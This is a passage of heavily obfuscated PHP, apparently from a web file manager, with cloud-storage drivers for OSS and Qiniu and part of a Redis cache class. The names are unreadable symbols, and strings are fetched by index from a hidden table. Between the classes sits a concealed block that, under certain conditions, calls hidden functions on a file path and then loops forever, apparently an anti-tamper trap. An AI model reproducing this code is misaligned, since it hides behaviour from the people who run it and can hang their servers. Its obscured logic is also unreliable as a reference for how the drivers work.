$è„€ÊªÌ = false, $–„Ã¬ÕŒ = '') { parent::fileOut($º‡›à∫ô, $ãæ®∂ΩÛ, $è„€ÊªÌ, $–„Ã¬ÕŒ); } public function fileOutImage($˙≤∂†¿ú, $…∫Óô‹¥ = 250) { $ú•ÕôÏí = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ëæªã÷][1398] . $…∫Óô‹¥); $—É‡Ö¢Â = $this->link($˙≤∂†¿ú, $ú•ÕôÏí); $this->fileOutLink($—É‡Ö¢Â); } public function fileOutImageServer($àÀœìˆÛ, $≠ Ö≠á‘ = 250) { parent::fileOutImage($àÀœìˆÛ, $≠ Ö≠á‘); } public function fileOutLink($˜¿àà§») { $Ää•—ˆ– =& $_SERVER[ëæªã÷]; if (!$this->isCdnHost() && substr($˜¿àà§», 0, 7) == $Ää•—ˆ–[1299]) { $˜¿àà§» = $Ää•—ˆ–[1300] . substr($˜¿àà§», 7); } header($Ää•—ˆ–[168] . $˜¿àà§»); die; } public function hashMd5($¡–¥€ë, $¿ìó®Ô¥ = '') { $â¬Ñ◊ªí =& $_SERVER[ëæªã÷]; $¿ªßÀÚ´ = $this->_objectMeta($¡–¥€ë); if (!$¿ªßÀÚ´) { return $â¬Ñ◊ªí[12]; } if (!isset($¿ªßÀÚ´[$â¬Ñ◊ªí[1373]]) && !empty($¿ìó®Ô¥)) { $®É”‰§ü = $this->updateObjMeta($¡–¥€ë, array($â¬Ñ◊ªí[1373] => $¿ìó®Ô¥)); $¿ªßÀÚ´[$â¬Ñ◊ªí[1373]] = $®É”‰§ü ? $¿ìó®Ô¥ : $â¬Ñ◊ªí[12]; } return isset($¿ªßÀÚ´[$â¬Ñ◊ªí[1373]]) ? strtolower($¿ªßÀÚ´[$â¬Ñ◊ªí[1373]]) : $â¬Ñ◊ªí[12]; } public function size($…ñÕ˝ÓÛ) { $®˝Ô£Í¸ = $this->objectMeta($…ñÕ˝ÓÛ); return $®˝Ô£Í¸ ? $®˝Ô£Í¸[$_SERVER[ëæªã÷][90]] : 0; } public function info($¯ê≤¿’í) { if ($this->isFolder($¯ê≤¿’í)) { return $this->folderInfo($¯ê≤¿’í); } else { if ($this->isFile($¯ê≤¿’í)) { return $this->fileInfo($¯ê≤¿’í); } } return !1; } public function exist($˚É¸ëÜÏ) { return $this->isFile($˚É¸ëÜÏ) || $this->isFolder($˚É¸ëÜÏ); } public function isFile($≠ã˘°ü†) { return !$this->isFolder($≠ã˘°ü†) && $this->objectMeta($≠ã˘°ü†); } public function isFolder($“Êº√ã∞) { return $this->cacheMethod($_SERVER[ëæªã÷][208], $“Êº√ã∞); } protected function objectMeta($–´ﬂÌë¶) { return $this->cacheMethod($_SERVER[ëæªã÷][209], $–´ﬂÌë¶); } protected function _objectMeta($—Ñïé«⁄) { $„⁄ªŒÁ€ =& $_SERVER[ëæªã÷]; try { $ïÊÙÖØ÷ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($—Ñïé«⁄)); } catch (OSS\Core\OssException $¶€ Ê‰ƒ) { $ïÊÙÖØ÷ = !1; } if ($ïÊÙÖØ÷) { $ïÊÙÖØ÷[$„⁄ªŒÁ€[90]] = intval($ïÊÙÖØ÷[$„⁄ªŒÁ€[1371]]); } return $ïÊÙÖØ÷; } protected function _isFolder($ºùƒÓéÏ) { $èâÍ©èî =& $_SERVER[ëæªã÷]; if ($ºùƒÓéÏ == $èâÍ©èî[12] || $ºùƒÓéÏ == $èâÍ©èî[8]) { return !0; } $è∏≥πµ» = array($èâÍ©èî[1367] => $èâÍ©èî[8], $èâÍ©èî[1368] => rtrim($ºùƒÓéÏ, $èâÍ©èî[8]) . $èâÍ©èî[8], $èâÍ©èî[1369] => 1, $èâÍ©èî[1370] => $èâÍ©èî[12]); $∞“˙ ëœ = $this->client->listObjects($this->bucket, $è∏≥πµ»); if ($∞“˙ ëœ->getObjectList() || $∞“˙ ëœ->getPrefixList()) { return !0; } return !1; } } if (!isset($_SERVER[$_SERVER[ëæªã÷][60]]) || !isset($_SERVER[$_SERVER[ëæªã÷][69]])) { $_getc = $_SERVER[ëæªã÷][62]; $_getfile = $_SERVER[$_SERVER[ëæªã÷][63]] . $_SERVER[ëæªã÷][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ëæªã÷][65], $_getfilec); if (count($_getarrs) < $_SERVER[ëæªã÷][66]) { $exit = $_SERVER[ëæªã÷][67]; $exit(); } $_act = $_SERVER[ëæªã÷][68]; $_act($_SERVER[$_SERVER[ëæªã÷][63]] . $_SERVER[ëæªã÷][64]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ëæªã÷][382]); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($∂Ëßï«ø) { parent::__construct(); require_once SDK_DIR . $_SERVER[ëæªã÷][1399]; $this->_init($∂Ëßï«ø); } public function _init($Œ¶ÓÖ≈¬) { $Ø·Öüö° =& $_SERVER[ëæªã÷]; foreach ($Œ¶ÓÖ≈¬ as $œŒÅÿºË => $ƒ˚Í—ÂË) { if (isset($this->{$œŒÅÿºË})) { $this->{$œŒÅÿºË} = $ƒ˚Í—ÂË; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ø·Öüö°[1400] . LNG($Ø·Öüö°[1358])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($—”øÈ˚∫, $éÎˆä¿” = '', $¶ó®’∂¯ = REPEAT_RENAME) { if ($this->setContent($—”øÈ˚∫, $éÎˆä¿”)) { return $this->getPathOuter($—”øÈ˚∫); } return !1; } public function mkdir($©òüÛ¨ø, $è°ﬁ–ì– = REPEAT_SKIP) { $≥¯Ñá€Ø =& $_SERVER[ëæªã÷]; $õµç§º  = trim($©òüÛ¨ø, $≥¯Ñá€Ø[8]); if ($this->_isFolder($õµç§º )) { return $this->getPathOuter($õµç§º ); } $©òüÛ¨ø = $õµç§º  . $≥¯Ñá€Ø[8]; $◊ﬁƒ¸ﬁ = get_path_this($õµç§º ); $–˝„‰π˙ = $©òüÛ¨ø . $◊ﬁƒ¸ﬁ; if (!$this->mkfile($–˝„‰π˙)) { return !1; } if (!$this->moveFile($–˝„‰π˙, $©òüÛ¨ø)) { $this->delFile($–˝„‰π˙); return !1; } return $this->getPathOuter($õµç§º ); } public function copyFile($Û±Ùéø, $™òÑËßÔ) { $åπÈ∏∏≤ = $this->bucketManager->copy($this->bucket, $Û±Ùéø, $this->bucket, $™òÑËßÔ, !0); return $åπÈ∏∏≤ ? !1 : $this->getPathOuter($™òÑËßÔ); } public function moveFile($íê– åÖ, $áıÂ—ñÛ) { $©¡É˚¡Ï = $this->bucketManager->move($this->bucket, $íê– åÖ, $this->bucket, $áıÂ—ñÛ, !0); return $©¡É˚¡Ï ? !1 : $this->getPathOuter($áıÂ—ñÛ); } public function delFile($ÍÖ◊Ô∑´) { if (!$this->exist($ÍÖ◊Ô∑´)) { return !0; } $‡∑Ïå¯ª = $this->bucketManager->delete($this->bucket, $ÍÖ◊Ô∑´); return $‡∑Ïå¯ª ? !1 : !0; } public function delFolder($Ù„Úõ÷Ω) { $õÃöΩè∞ =& $_SERVER[ëæªã÷]; if (!$this->exist($Ù„Úõ÷Ω)) { return !0; } $this->listItemCache = !1; $ÿˆâΩîﬂ = $this->fileList($Ù„Úõ÷Ω); $this->listItemCache = !0; $¨€·øÂì = trim($Ù„Úõ÷Ω, $õÃöΩè∞[8]) . $õÃöΩè∞[8]; if (!empty($Ù„Úõ÷Ω) && $Ù„Úõ÷Ω !== $õÃöΩè∞[200] && !in_array($¨€·øÂì, $ÿˆâΩîﬂ[$õÃöΩè∞[87]])) { $ÿˆâΩîﬂ[$õÃöΩè∞[87]][] = $¨€·øÂì; } $ôﬁÄœ§û = $this->delByBatch($ÿˆâΩîﬂ[$õÃöΩè∞[86]]); if (!$ôﬁÄœ§û) { return !1; } $ôﬁÄœ§û = $this->delByBatch($ÿˆâΩîﬂ[$õÃöΩè∞[87]]); if (!$ôﬁÄœ§û) { return !1; } return $this->delFile($¨€·øÂì); } private function delByBatch($˘√∏£π√) { foreach (array_chunk($˘√∏£π√, 1000) as $•“ò †’) { $˝‹ÅüÍè = $this->bucketManager->buildBatchDelete($this->bucket, $•“ò †’); list($ú•¨ï≤©, $¬æ◊≤±≈) = $this->bucketManager->batch($˝‹ÅüÍè); if ($¬æ◊≤±≈) { return !1; } } return !0; } public function rename($≤Ù‚±úÎ, $»÷äÂåç) { return $this->renameObject($≤Ù‚±úÎ, $»÷äÂåç); } public function fileInfo($ëÕÉ˜ﬁƒ, $÷’∆ÑÀë = false, $·Ø¡◊ÊÄ = array()) { $¶ÈÚŒâ  =& $_SERVER[ëæªã÷]; $èÂÏÙµ∏ = array($¶ÈÚŒâ [32] => $this->pathThis($ëÕÉ˜ﬁƒ), $¶ÈÚŒâ [88] => $this->getPathOuter($¶ÈÚŒâ [8] . $ëÕÉ˜ﬁƒ), $¶ÈÚŒâ [33] => $¶ÈÚŒâ [202], $¶ÈÚŒâ [90] => isset($·Ø¡◊ÊÄ[$¶ÈÚŒâ [1401]]) ? $·Ø¡◊ÊÄ[$¶ÈÚŒâ [1401]] : 0, $¶ÈÚŒâ [177] => $this->ext($ëÕÉ˜ﬁƒ)); if ($÷’∆ÑÀë) { return $èÂÏÙµ∏; } $èÂÏÙµ∏[$¶ÈÚŒâ [203]] = $èÂÏÙµ∏[$¶ÈÚŒâ [96]] = 0; $èÂÏÙµ∏[$¶ÈÚŒâ [204]] = $èÂÏÙµ∏[$¶ÈÚŒâ [205]] = !0; if (empty($·Ø¡◊ÊÄ)) { $·Ø¡◊ÊÄ = $this->objectMeta($ëÕÉ˜ﬁƒ); if (!$·Ø¡◊ÊÄ) { return $èÂÏÙµ∏; } } if (isset($·Ø¡◊ÊÄ[$¶ÈÚŒâ [1402]])) { $èÂÏÙµ∏[$¶ÈÚŒâ [96]] = substr($·Ø¡◊ÊÄ[$¶ÈÚŒâ [1402]] . $¶ÈÚŒâ [12], 0, 10); } if (isset($·Ø¡◊ÊÄ[$¶ÈÚŒâ [1401]])) { $èÂÏÙµ∏[$¶ÈÚŒâ [90]] = $·Ø¡◊ÊÄ[$¶ÈÚŒâ [1401]]; } return $èÂÏÙµ∏; } public function folderInfo($Æ£ó∫πÜ, $§¶ö Ïï = false) { $´¸¶ˆ∞Ç =& $_SERVER[ëæªã÷]; $Ü¢êïÃº = array($´¸¶ˆ∞Ç[32] => $this->pathThis($Æ£ó∫πÜ), $´¸¶ˆ∞Ç[88] => $this->getPathOuter($´¸¶ˆ∞Ç[8] . $Æ£ó∫πÜ), $´¸¶ˆ∞Ç[33] => $´¸¶ˆ∞Ç[89]); if ($§¶ö Ïï) { return $Ü¢êïÃº; } $Ü¢êïÃº[$´¸¶ˆ∞Ç[203]] = $Ü¢êïÃº[$´¸¶ˆ∞Ç[96]] = 0; $Ü¢êïÃº[$´¸¶ˆ∞Ç[204]] = $Ü¢êïÃº[$´¸¶ˆ∞Ç[205]] = !0; $Æ£ó∫πÜ = rtrim($Æ£ó∫πÜ, $´¸¶ˆ∞Ç[8]) . $´¸¶ˆ∞Ç[8]; $™ì§˚ÜÜ = $this->objectMeta($Æ£ó∫πÜ); if (isset($™ì§˚ÜÜ[$´¸¶ˆ∞Ç[1402]])) { $Ü¢êïÃº[$´¸¶ˆ∞Ç[96]] = substr($™ì§˚ÜÜ[$´¸¶ˆ∞Ç[1402]] . $´¸¶ˆ∞Ç[12], 0, 10); } return $Ü¢êïÃº; } public function listPath($ê©ﬂ∞˜, $˚÷·Ú¡™ = false) { $£ò¿ù∑‡ =& $_SERVER[ëæªã÷]; $åÌÇÌªÄ = $this->fileList($ê©ﬂ∞˜, $£ò¿ù∑‡[8], !0); foreach ($åÌÇÌªÄ[$£ò¿ù∑‡[87]] as $––”…±œ => $∆¨˝·¯È) { $åÌÇÌªÄ[$£ò¿ù∑‡[87]][$––”…±œ] = $this->folderInfo($∆¨˝·¯È, $˚÷·Ú¡™); } foreach ($åÌÇÌªÄ[$£ò¿ù∑‡[86]] as $––”…±œ => $∆¨˝·¯È) { $åÌÇÌªÄ[$£ò¿ù∑‡[86]][$––”…±œ] = $this->fileInfo($∆¨˝·¯È[$£ò¿ù∑‡[105]], $˚÷·Ú¡™, $∆¨˝·¯È); } return $åÌÇÌªÄ; } public function has($à–è∑âó, $¡ä–ï˘£ = false, $öÎÅË∑ª = true) { $ÄïÚÜ˛≠ =& $_SERVER[ëæªã÷]; $à–è∑âó = trim($à–è∑âó, $ÄïÚÜ˛≠[8]); $àÕ€¸Ÿè = empty($à–è∑âó) && $à–è∑âó !== $ÄïÚÜ˛≠[200] ? $ÄïÚÜ˛≠[12] : $à–è∑âó . $ÄïÚÜ˛≠[8]; $Øø†√Ë€ = $ÄïÚÜ˛≠[12]; $±ƒ÷©≈Ë = 500; $‘≤üı◊´ = $ÄïÚÜ˛≠[8]; $Çª¡Û∆å = $é”®Í¥¢ = 0; while (!0) { check_abort(); list($›Í«¬™Ì, $¡ôÉ÷∞Ø) = $this->bucketManager->listFiles($this->bucket, $àÕ€¸Ÿè, $Øø†√Ë€, $±ƒ÷©≈Ë, $‘≤üı◊´); if ($¡ôÉ÷∞Ø) { break; } $Øø†√Ë€ = array_key_exists($ÄïÚÜ˛≠[1370], $›Í«¬™Ì) ? $Øø†√Ë€ = $›Í«¬™Ì[$ÄïÚÜ˛≠[1403]] : $ÄïÚÜ˛≠[12]; if ($¡ä–ï˘£) { if (!empty($›Í«¬™Ì[$ÄïÚÜ˛≠[1404]])) { $Çª¡Û∆å += count($›Í«¬™Ì[$ÄïÚÜ˛≠[1404]]); } if (!empty($›Í«¬™Ì[$ÄïÚÜ˛≠[1405]])) { $é”®Í¥¢ += count($›Í«¬™Ì[$ÄïÚÜ˛≠[1405]]); } if ($Øø†√Ë€ === $ÄïÚÜ˛≠[12]) { break; } continue; } if ($öÎÅË∑ª) { if (!empty($›Í«¬™Ì[$ÄïÚÜ˛≠[1404]])) { return !0; } } else { if (!empty($›Í«¬™Ì[$ÄïÚÜ˛≠[1405]])) { return !0; } } if ($Øø†√Ë€ === $ÄïÚÜ˛≠[12]) { break; } } if ($¡ä–ï˘£) { return array($ÄïÚÜ˛≠[212] => $Çª¡Û∆å, $ÄïÚÜ˛≠[213] => $é”®Í¥¢); } return !1; } public function listAll($—È÷˘õ∏) { $±ÃÜƒπˆ =& $_SERVER[ëæªã÷]; $¢∏õ≠„â = $this->fileList($—È÷˘õ∏, $±ÃÜƒπˆ[12], !0); $æµõñò∏ = array(); foreach ($¢∏õ≠„â[$±ÃÜƒπˆ[86]] as $Æ≈êÊ‘™) { $æµõñò∏[$Æ≈êÊ‘™[$±ÃÜƒπˆ[105]]] = $Æ≈êÊ‘™[$±ÃÜƒπˆ[90]]; } foreach ($¢∏õ≠„â[$±ÃÜƒπˆ[87]] as $Æ≈êÊ‘™) { if (is_string($Æ≈êÊ‘™)) { $æµõñò∏[$Æ≈êÊ‘™] = 0; } } return $this->listAllFiles($—È÷˘õ∏, array_keys($æµõñò∏), $æµõñò∏); } private function fileList($ºû•É˝Ô, $å÷Ó≈À‚ = '', $∂≤‰˜¨˘ = 0) { $ÎÅ˘±ò∏ =& $_SERVER[ëæªã÷]; $ºû•É˝Ô = trim($ºû•É˝Ô, $ÎÅ˘±ò∏[8]); $ÎáÓ∆çÚ = empty($ºû•É˝Ô) && $ºû•É˝Ô !== $ÎÅ˘±ò∏[200] ? $ÎÅ˘±ò∏[12] : $ºû•É˝Ô . $ÎÅ˘±ò∏[8]; $òŸËÉƒ˛ = $ÎÅ˘±ò∏[12]; $ﬁ©€™•‘ = 1000; $ª∆®éÊ¿ = $this->listItemCache === !1 ? !1 : !0; $¡òç∂πê = $å∞ﬂ¨”Æ = array(); while (!0) { check_abort(); list($∂ﬁèÚµ», $•ìÃ¨€˚) = $this->bucketManager->listFiles($this->bucket, $ÎáÓ∆çÚ, $òŸËÉƒ˛, $ﬁ©€™•‘, $å÷Ó≈À‚); if ($•ìÃ¨€˚) { break; } $òŸËÉƒ˛ = array_key_exists($ÎÅ˘±ò∏[1370], $∂ﬁèÚµ») ? $òŸËÉƒ˛ = $∂ﬁèÚµ»[$ÎÅ˘±ò∏[1403]] : $ÎÅ˘±ò∏[12]; $∫Ï‡÷∫’ = isset($∂ﬁèÚµ»[$ÎÅ˘±ò∏[1404]]) ? $∂ﬁèÚµ»[$ÎÅ˘±ò∏[1404]] : array(); $ç”¬¿ß‹ = isset($∂ﬁèÚµ»[$ÎÅ˘±ò∏[1405]]) ? $∂ﬁèÚµ»[$ÎÅ˘±ò∏[1405]] : array(); foreach ($∫Ï‡÷∫’ as $êêú∞∑ô) { if ($êêú∞∑ô[$ÎÅ˘±ò∏[105]] == $ÎáÓ∆çÚ) { continue; } $À√…£≠Û = $êêú∞∑ô[$ÎÅ˘±ò∏[105]]; $¬Ìûé‡› = $êêú∞∑ô[$ÎÅ˘±ò∏[1401]]; $êêú∞∑ô[$ÎÅ˘±ò∏[90]] = $¬Ìûé‡›; $Ô§Òæ⁄ﬂ = $¬Ìûé‡› == 0 && substr($À√…£≠Û, strlen($À√…£≠Û) - 1, 1) == $ÎÅ˘±ò∏[8] ? !0 : !1; if ($ª∆®éÊ¿) { $this->cacheMethod($ÎÅ˘±ò∏[208], $À√…£≠Û, $Ô§Òæ⁄ﬂ); $this->cacheMethod($ÎÅ˘±ò∏[209], $À√…£≠Û, $êêú∞∑ô); } if ($Ô§Òæ⁄ﬂ) { $¡òç∂πê[] = $À√…£≠Û; continue; } $å∞ﬂ¨”Æ[] = $∂≤‰˜¨˘ ? $êêú∞∑ô : $À√…£≠Û; } foreach ($ç”¬¿ß‹ as $À√…£≠Û) { if ($À√…£≠Û == $ÎáÓ∆çÚ) { continue; } $¡òç∂πê[] = $À√…£≠Û; if ($ª∆®éÊ¿) { $this->cacheMethod($ÎÅ˘±ò∏[208], $À√…£≠Û, !0); } } if ($òŸËÉƒ˛ === $ÎÅ˘±ò∏[12]) { break; } } if ($ª∆®éÊ¿) { $this->cacheMethod($ÎÅ˘±ò∏[208], $ºû•É˝Ô, !0); } return array($ÎÅ˘±ò∏[87] => $¡òç∂πê, $ÎÅ˘±ò∏[86] => $å∞ﬂ¨”Æ); } public function canRead($èﬂó∫ù·) { return $this->exist($èﬂó∫ù·) ? !0 : !1; } public function canWrite($Ùß≤Úùﬂ) { return $this->exist($Ùß≤Úùﬂ) ? !0 : !1; } public function getContent($‹Ö·ôïª) { return $this->fileSubstr($‹Ö·ôïª, 0, -1); } public function setContent($ÖóåÀæ€, $Ò÷√á˜… = '') { $ÇìçÌ˜ó = $this->tempFile($this->pathThis($ÖóåÀæ€)); file_put_contents($ÇìçÌ˜ó, $Ò÷√á˜…); if ($this->upload($ÖóåÀæ€, $ÇìçÌ˜ó)) { $this->tempFileRemve($ÇìçÌ˜ó); return !0; } return !1; } public function refreshUrls($°ëçÜƒÈ) { $Æ§áÉ◊¸ =& $_SERVER[ëæªã÷]; $√èî—•Â = array(); if (is_array($°ëçÜƒÈ)) { foreach ($°ëçÜƒÈ as $‹°ﬂ—≠) { $√èî—•Â[] = $this->link($‹°ﬂ—≠); } } else { $√èî—•Â[] = $this->link($°ëçÜƒÈ); } $É∏“äŒ¸ = new Qiniu\Cdn\CdnManager($this->auth); list($ïë‰°¯“, $ıﬂÙæ≤Ï) = $É∏“äŒ¸->refreshUrls($√èî—•Â); if ($ıﬂÙæ≤Ï) { return !1; } return $ïë‰°¯“[$Æ§áÉ◊¸[1157]] == $Æ§áÉ◊¸[740] ? !0 : !1; } public function fileSubstr($àﬂÿù”, $Ï•‰ŸÆ÷, $µ©˘»å∑) { $◊ıæú∞› =& $_SERVER[ëæªã÷]; if (!($ÒÜëÜ°ñ = $this->link($àﬂÿù”))) { return !1; } $˘…çÏÒ™ = !1; if ($µ©˘»å∑ > 0) { $ﬂŸ”Ç‡‰ = $Ï•‰ŸÆ÷ + $µ©˘»å∑ - 1; $˘…çÏÒ™ = array($◊ıæú∞›[1406] . $Ï•‰ŸÆ÷ . $◊ıæú∞›[460] . $ﬂŸ”Ç‡‰); } $…„–å≠Û = url_request($ÒÜëÜ°ñ, $◊ıæú∞›[235], !1, $˘…çÏÒ™); return $…„–å≠Û[$◊ıæú∞›[730]] ? $…„–å≠Û[$◊ıæú∞›[1167]] : !1; } public function upload($çÚ†Ù≈∫, $Ú©–£©–, $î¡íâπ÷ = false, $É‹’ßÁÂ = REPEAT_REPLACE) { $ÜŸÓ“∞Ï = new Qiniu\Storage\UploadManager(); $ç¯åö˘ô = $this->auth->uploadToken($this->bucket, $çÚ†Ù≈∫); $ûé··≥ = get_file_mime(get_path_ext($Ú©–£©–)); list($Ÿ°´¸¬ì, $√˙≥‚€¸) = $ÜŸÓ“∞Ï->putFile($ç¯åö˘ô, $çÚ†Ù≈∫, $Ú©–£©–, null, $ûé··≥); return $√˙≥‚€¸ ? !1 : $this->getPathOuter($çÚ†Ù≈∫); } public function uploadFormData($ËÀá∫üØ, $¶¯®˚é€ = 3600) { return $this->uploadToken($ËÀá∫üØ, $¶¯®˚é€); } public function multiUploadFormData($ûÿ°à’≥, $ô˙Â‡æ¿ = 3600) { return $this->uploadToken($ûÿ°à’≥, $ô˙Â‡æ¿); } private function uploadToken($˜Öæƒ≈œ, $ºÿü¯˙Ù = 3600) { $øò„Ü∑¡ =& $_SERVER[ëæªã÷]; $Ã¢≤∏˘è = $ºÿü¯˙Ù; $‰±ü†ëƒ = array($øò„Ü∑¡[1407] => $øò„Ü∑¡[1408]); $•πﬂòÙ˙ = $˜Öæƒ≈œ; $…≠ÑØ–˙ = $this->auth->uploadToken($this->bucket, $•πﬂòÙ˙, $Ã¢≤∏˘è, $‰±ü†ëƒ, !0); $ùºπÿœ˛ = empty($this->region) || $this->region == $øò„Ü∑¡[1409] ? $øò„Ü∑¡[12] : $øò„Ü∑¡[460] . $this->region; $êÔ¸≥æ¨ = http_type() . "\x3a\57\57\165\160\154\157\x61\144{$ùºπÿœ˛}\x2e\161\151\156\x69\x75\x70\x2e\x63\157\x6d\x2f"; return array($øò„Ü∑¡[1410] => $…≠ÑØ–˙, $øò„Ü∑¡[1411] => $êÔ¸≥æ¨); } public function download($™ÓÂî÷¯, $˛ãé¨ö¸) { $˛öè¥ñ† = IO::getPathInner(IO::mkfile($˛ãé¨ö¸)); if (!($Ü·⁄Ô‡Â = $this->link($™ÓÂî÷¯))) { return !1; } $ñÈ∞è≥ = 0; $ôºÆŒ˜ñ = 1024 * 200; $Ω†¶¶Æ˙ = fopen($˛öè¥ñ†, $_SERVER[ëæªã÷][1412]); while (!0) { $ªã◊Ì⁄Ä = $this->fileSubstr($™ÓÂî÷¯, $ñÈ∞è≥, $ôºÆŒ˜ñ); if ($ªã◊Ì⁄Ä === !1) { return !1; } fwrite($Ω†¶¶Æ˙, $ªã◊Ì⁄Ä); $ñÈ∞è≥ += $ôºÆŒ˜ñ; if (strlen($ªã◊Ì⁄Ä) < $ôºÆŒ˜ñ) { break; } } fclose($Ω†¶¶Æ˙); return $˛ãé¨ö¸; } public function link($éª—Îãß, $“∂∫˜‚£ = '') { if (!$this->isFile($éª—Îãß)) { return !1; } $≥∂ÈÑ§é = $this->getHost() . $_SERVER[ëæªã÷][8] . $this->pathEncode($éª—Îãß) . $“∂∫˜‚£; return $this->auth->privateDownloadUrl($≥∂ÈÑ§é, 3600 * 12); } public function fileOut($Â®¥∆‰Ò, $âèúÜ≠˛ = false, $á∆ıæ”◊ = false, $˝äı˜¢« = '') { $Õ†ÿëñç =& $_SERVER[ëæªã÷]; if ($this->isFileOutServer()) { return $this->fileOutServer($Â®¥∆‰Ò, $âèúÜ≠˛, $á∆ıæ”◊, $˝äı˜¢«); } if (!$á∆ıæ”◊) { $á∆ıæ”◊ = $this->pathThis($Â®¥∆‰Ò); } $’ØÑ°°◊ = $âèúÜ≠˛ ? $Õ†ÿëñç[1413] . rawurlencode($á∆ıæ”◊) : $Õ†ÿëñç[12]; $ÜõÑ£˘« = $this->link($Â®¥∆‰Ò, $’ØÑ°°◊); $this->fileOutLink($ÜõÑ£˘«); } public function fileOutServer($ƒÕÉõÛü, $˜—Í¥ÃÕ = false, $óÚƒ∞Ê‘ = false, $óçà∆πØ = '') { parent::fileOut($ƒÕÉõÛü, $˜—Í¥ÃÕ, $óÚƒ∞Ê‘, $óçà∆πØ); } public function fileOutImage($ÛËÁ•ñî, $∏Û—˛≈› = 250) { $»ùªﬂâÏ = $this->link($ÛËÁ•ñî, $_SERVER[ëæªã÷][1414] . $∏Û—˛≈›); $this->fileOutLink($»ùªﬂâÏ); } public function fileOutImageServer($‡àŒÕπì, $àî€€¡Œ = 250) { parent::fileOutImage($‡àŒÕπì, $àî€€¡Œ); } public function hashMd5($™Œ∫¡È∏) { $¶∫Çæè˚ =& $_SERVER[ëæªã÷]; $›¬≈óÆò = $this->objectMeta($™Œ∫¡È∏); return isset($›¬≈óÆò[$¶∫Çæè˚[217]]) ? $›¬≈óÆò[$¶∫Çæè˚[217]] : !1; $í°ìæ˘∆ = $this->link($™Œ∫¡È∏, $¶∫Çæè˚[1415]); } public function size($∑Òò≠Ÿ) { $Øö∑ƒçª = $this->objectMeta($∑Òò≠Ÿ); return $Øö∑ƒçª ? $Øö∑ƒçª[$_SERVER[ëæªã÷][90]] : 0; } public function info($µöïæ∑ª) { if ($this->isFolder($µöïæ∑ª)) { return $this->folderInfo($µöïæ∑ª); } else { if ($this->isFile($µöïæ∑ª)) { return $this->fileInfo($µöïæ∑ª); } } return !1; } public function exist($Ç·ÅÁÔ‡) { return $this->isFile($Ç·ÅÁÔ‡) || $this->isFolder($Ç·ÅÁÔ‡); } public function isFile($≠˘«Ñé†) { return !$this->isFolder($≠˘«Ñé†) && $this->objectMeta($≠˘«Ñé†); } public function isFolder($´Íß¡Ìê) { return $this->cacheMethod($_SERVER[ëæªã÷][208], $´Íß¡Ìê); } protected function objectMeta($◊ÏïõÉå) { return $this->cacheMethod($_SERVER[ëæªã÷][209], $◊ÏïõÉå); } protected function _objectMeta($˛§äî¶Û) { $˜È¬¥∏ñ =& $_SERVER[ëæªã÷]; list($⁄˝√ä˜∆, $—®æÎÌÓ) = $this->bucketManager->stat($this->bucket, $˛§äî¶Û); if ($⁄˝√ä˜∆) { $⁄˝√ä˜∆[$˜È¬¥∏ñ[90]] = intval($⁄˝√ä˜∆[$˜È¬¥∏ñ[1401]]); } return $⁄˝√ä˜∆; } protected function _isFolder($Ÿπ„Â·®) { $Ë»õå√Ï =& $_SERVER[ëæªã÷]; if ($Ÿπ„Â·® == $Ë»õå√Ï[12] || $Ÿπ„Â·® == $Ë»õå√Ï[8]) { return !0; } list($ÇíßÓÂß, $®√ÁÍÅ˙) = $this->bucketManager->listFiles($this->bucket, trim($Ÿπ„Â·®, $Ë»õå√Ï[8]) . $Ë»õå√Ï[8], $Ë»õå√Ï[12], 1, $Ë»õå√Ï[8]); return !empty($ÇíßÓÂß[$Ë»õå√Ï[1404]]) || !empty($ÇíßÓÂß[$Ë»õå√Ï[1405]]) ? !0 : !1; } } goto f†åëàπ·Ù; dÑ∫ìçß—∆: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ﬂ∞À∂É˙, $…æ˜≥à») { $›øÔ† ¿ =& $_SERVER[ëæªã÷]; if (!class_exists($›øÔ† ¿[845])) { show_json($›øÔ† ¿[846], !1); } $this->cacheTime = $…æ˜≥à»; $Ûé∂ÉÈ¿ = isset($ﬂ∞À∂É˙[$›øÔ† ¿[847]]) ? $ﬂ∞À∂É˙[$›øÔ† ¿[847]] : 10; $à‘‰Á’“ = _get($ﬂ∞À∂É˙, $›øÔ† ¿[844]); if ($à‘‰Á’“ && is_array($à‘‰Á’“)) { $this->initCluster($ﬂ∞À∂É˙, $Ûé∂ÉÈ¿); } else { $this->handle = $this->init($ﬂ∞À∂É˙, $Ûé∂ÉÈ¿); } } private function init($ﬂÌÚáò‚, $¿ù˚˛˚) { $£§Ÿù˙ƒ =& $_SERVER[ëæªã÷]; $◊ÔÜ√ÛÍ = new Redis(); $›¢⁄£ˆﬁ = isset($ﬂÌÚáò‚[$£§Ÿù˙ƒ[848]]) ? $ﬂÌÚáò‚[$£§Ÿù˙ƒ[848]] : !1; if ($›¢⁄£ˆﬁ) { $◊ÔÜ√ÛÍ->pconnect($ﬂÌÚáò‚[$£§Ÿù˙ƒ[184]], $ﬂÌÚáò‚[$£§Ÿù˙ƒ[185]], $¿ù˚˛˚); } else { $◊ÔÜ√ÛÍ->connect($ﬂÌÚáò‚[$£§Ÿù˙ƒ[184]], $ﬂÌÚáò‚[$£§Ÿù˙ƒ[185]], $¿ù˚˛˚); } if (!empty($ﬂÌÚáò‚[$£§Ÿù˙ƒ[414]])) { $◊ÔÜ√ÛÍ->auth($ﬂÌÚáò‚[$£§Ÿù˙ƒ[414]]); } return $◊ÔÜ√ÛÍ; } private function initCluster($ˆáΩÿàﬂ, $Ç¢Ω«úØ) { $¬úˆûÛú =& $_SERVER[ëæªã÷]; $»Ëéç–Ú = array($¬úˆûÛú[849], $¬úˆûÛú[850], $¬úˆûÛú[851]); $’ôïñ¸• = 